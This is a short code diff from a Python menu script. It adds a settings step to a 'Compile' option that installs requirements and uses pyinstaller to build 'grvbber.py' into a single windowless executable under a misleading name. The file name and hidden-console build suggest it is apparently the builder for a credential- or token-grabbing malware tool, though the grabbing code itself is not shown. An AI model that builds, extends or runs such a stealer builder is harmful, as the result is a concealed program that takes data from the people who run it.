@@ -139,6 +139,7 @@ def menu():
                 cls()
                 menu()
             elif name == 'Compile':
+                applysettings()
                 Logging.info('Turning into an exe')
                 os.system('pip install -r requirements.txt')
                 os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py')
